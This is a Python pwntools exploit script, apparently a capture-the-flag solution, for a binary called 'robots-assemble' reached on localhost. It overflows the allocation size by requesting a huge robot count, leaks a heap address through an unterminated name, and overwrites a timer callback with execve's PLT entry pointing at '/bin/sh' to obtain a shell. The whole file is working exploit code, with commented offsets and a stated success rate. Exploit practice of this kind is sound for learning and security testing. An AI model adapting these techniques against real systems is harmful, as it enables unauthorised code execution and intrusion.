#!/usr/bin/env python3
from pwn import *

exe = ELF("robots-assemble")
context(binary=exe)

# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

DEBUG = 0
SIZEOF_ROBOT = 0x30
SECS = 1000 * 1000

gs = '''
b timers.c:132
'''

def build_robot(
		r,
		name: bytes,
		iq: int,
		self_aware: bool,
		evil: bool,
		timer_us: int):
	if DEBUG:
		r.recvuntil(b"DEBUG: robot")
		warn(b"robot" + r.recvline())
	
	r.recvuntil(b"Name?\n")
	r.send((name + b"\n")[:10])
	
	r.recvuntil(b"IQ for robot ")
	r.recvuntil(b"?\n")
	r.sendline(str(iq).encode())
	
	r.recvuntil(b" be self-aware?\n")
	r.sendline(b"y" if self_aware else b"n")
	
	r.recvuntil(b" be evil?\n")
	r.sendline(b"y" if evil else b"n")
	
	r.recvuntil(b" (in microseconds)?\n")
	r.sendline(str(timer_us).encode())
	
	name_out = r.recvuntil(b": \"", drop=True)
	r.recvuntil(b"\"\n")
	
	if DEBUG:
		r.recvuntil(b"DEBUG: ")
		warn(r.recvline())
	
	return name_out


def wrap64(x):
	return x & ((1 << 64) - 1)


def main():
	r = remote("localhost", "23000")
	#r = exe.debug(gdbscript=gs)
	#r = exe.process()
	
	# Calculate number of robots to correctly overflow
	ovf_size = (1 << 64) // SIZEOF_ROBOT + 1
	product_size = ovf_size * SIZEOF_ROBOT
	
	# Sanity checking
	assert product_size >= (1 << 64)
	assert wrap64(product_size) <= SIZEOF_ROBOT
	
	r.recvuntil(b"Enter number of robot turrets to manufacture:\n")
	r.sendline(str(ovf_size).encode())
	
	if DEBUG:
		r.recvuntil(b"DEBUG: ")
		warn(r.recvline())
	
	# R1: long timer and name "/bin/sh" for later
	info("R1: /bin/sh and prep for heap leak")
	build_robot(r, b"/bin/sh", 1337, False, False, 95 * SECS)
	
	# R2: longER timer. Must expire after T1 so T1->next is a heap
	#     pointer, not NULL
	info("R2: prepare heap pointer to leak")
	build_robot(r, b"nonnull", 2, False, False, 96 * SECS)
	
	# R3: no NUL bytes, will leak heap addr.
	#     small timer, as it's also the corruption target
	info("R3: heap leak")
	heap_leak = build_robot(r, b"0123456789", u32(b"ABCD"), True, True, 1 * SECS)
	heap_leak = heap_leak[0x10:]
	info(f'Leak: {repr(heap_leak)}')
	
	# Leaks T1->next, which will be &T2->node
	obj_addr = u64(heap_leak.ljust(8, b'\0'))
	
	# addr - 0x10 does container_of()
	# then, - 0x90 to go from R4 to R1
	binsh_addr = obj_addr - 0x10 - 0x90
	info(f'/bin/sh addr: {binsh_addr:#x}')
	
	# R4: doesn't matter, just need to get to R5
	info("R4: alignment")
	build_robot(r, b"align", 4, False, False, 99 * SECS)
	
	# R5: payload name, only partial send
	execve_plt = exe.plt["execve"]
	name = p64(binsh_addr)
	name += p16(execve_plt & 0xffff)
	info(f'R5: corrupt callback to execve.plt = {exe.plt["execve"]:#x}')
	r.recvuntil(b"Name?\n")
	r.send(name)
	
	# Just wait for the timer to trigger
	warn("Waiting for corrupted timer callback! This has a 6.25% success rate...")
	r.interactive()

if __name__ == "__main__":
	main()
